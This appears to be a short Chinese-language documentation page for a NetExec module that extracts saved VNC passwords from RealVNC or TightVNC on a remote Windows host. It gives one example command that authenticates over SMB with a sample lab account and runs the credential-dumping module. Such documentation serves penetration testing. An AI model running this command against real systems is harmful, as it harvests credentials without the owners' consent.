---
description: 从 RealVNC 或 TightVNC 导出 VNC 密码
---

# 🆕 从 RealVNC 或 TightVNC 导出 VNC 密码

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

RealVNC 或 TightVNC 允许用户存储连接的凭证。此模块将自动查找这些凭证，如果找到则提取它们。

```
nxc smb 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! -M vnc
```
